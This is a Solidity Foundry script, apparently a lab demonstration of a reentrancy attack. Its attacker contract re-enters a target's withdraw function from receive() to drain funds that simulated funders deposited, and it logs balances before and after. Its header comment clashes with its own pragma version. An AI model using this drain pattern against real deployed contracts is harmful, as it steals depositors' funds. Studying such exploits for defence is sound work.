// SPDX-License-Identifier: MIT

// This contract shd be executed in solidty less than 0.8.0 with safemath enabled on the main ReEntrancy contract

pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {ReEntrancy} from "../src/ReEntrancy.sol";

contract AttackReEntrancy {
    ReEntrancy public reEntrancy;
    uint256 public amount;

    constructor(address payable _reEntrancy) {
        reEntrancy = ReEntrancy(_reEntrancy);
    }

// First, call this function with some ETH to start the attack
    function attack() external payable {
        amount = msg.value;

        // Donate some ether to establish the balance
        reEntrancy.donate{value: msg.value}(address(this));

        // Withdraw all the ether
        reEntrancy.withdraw(msg.value);
    }

 // This receive function is key - it gets called when the vulnerable contract
    // sends ETH, and we use it to re-enter the withdraw function
    receive() external payable {
        uint256 balance = address(reEntrancy).balance; // Get the balance of the contract
        if (balance >= amount) {
            reEntrancy.withdraw(amount);
        }

    }
}


contract DeployReEntrancy is Script {
    address funder1 = makeAddr("Funder1");
    address funder2 = makeAddr("Funder2");
    address funder3 = makeAddr("Funder3");
    address attacker = makeAddr("Attacker");

    function run() external {
        ReEntrancy reEntrancy = new ReEntrancy();

        // Funder1 donates 1 ether
        vm.deal(funder1, 1 ether);
        vm.startPrank(funder1);
        reEntrancy.donate{value: 1 ether}(address(reEntrancy));
        vm.stopPrank();

        // Funder2 donates 1 ether
        vm.deal(funder2, 1 ether);
        vm.startPrank(funder2);
        reEntrancy.donate{value: 1 ether}(address(reEntrancy));
        vm.stopPrank();

        // Funder3 donates 1 ether
        vm.deal(funder3, 1 ether);
        vm.startPrank(funder3);
        reEntrancy.donate{value: 1 ether}(address(reEntrancy));
        vm.stopPrank();

        uint256 balanceBeforeAttack = address(reEntrancy).balance;
        console.log("Balance of the contract before attack:", balanceBeforeAttack);

        // Attacker starts the attack
        vm.deal(attacker, 2 ether);
        vm.startPrank(attacker);
        AttackReEntrancy attack = new AttackReEntrancy(payable(address(reEntrancy)));
        attack.attack{value: 1 ether}();
        vm.stopPrank();


        uint256 balanceAfterAttack = address(reEntrancy).balance;
        console.log("Balance of the contract after attack:", balanceAfterAttack);

        uint256 attackerContractBalance = address(attack).balance;
        console.log("Attacker contract balance:", attackerContractBalance);
    }
}
